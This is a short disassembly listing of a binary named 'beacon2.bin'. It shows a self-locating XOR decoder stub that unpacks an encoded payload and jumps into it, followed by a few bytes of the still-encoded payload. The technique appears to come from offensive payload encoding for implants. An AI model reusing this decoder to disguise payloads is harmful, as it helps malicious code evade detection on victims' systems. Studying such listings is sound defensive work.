
output/beacon2.bin:     file format binary


Disassembly of section .data:

00000000 <.data>:
       0:	eb 25                	jmp    0x27
       2:	58                   	pop    %eax
       3:	60                   	pusha  
       4:	8b 48 04             	mov    0x4(%eax),%ecx
       7:	33 08                	xor    (%eax),%ecx
       9:	8b f9                	mov    %ecx,%edi
       b:	c1 e9 02             	shr    $0x2,%ecx
       e:	8b 5c 07 04          	mov    0x4(%edi,%eax,1),%ebx
      12:	31 5c 07 08          	xor    %ebx,0x8(%edi,%eax,1)
      16:	83 ef 04             	sub    $0x4,%edi
      19:	49                   	dec    %ecx
      1a:	75 f2                	jne    0xe
      1c:	8b 18                	mov    (%eax),%ebx
      1e:	31 58 08             	xor    %ebx,0x8(%eax)
      21:	61                   	popa   
      22:	83 c0 08             	add    $0x8,%eax
      25:	ff e0                	jmp    *%eax
      27:	e8 d6 ff ff ff       	call   0x2
      2c:	44                   	inc    %esp
      2d:	92                   	xchg   %eax,%edx
      2e:	03 47 44             	add    0x44(%edi),%eax
      31:	ba 00 47 09 c8       	mov    $0xc8094700,%edx
      36:	eb 47                	jmp    0x7f
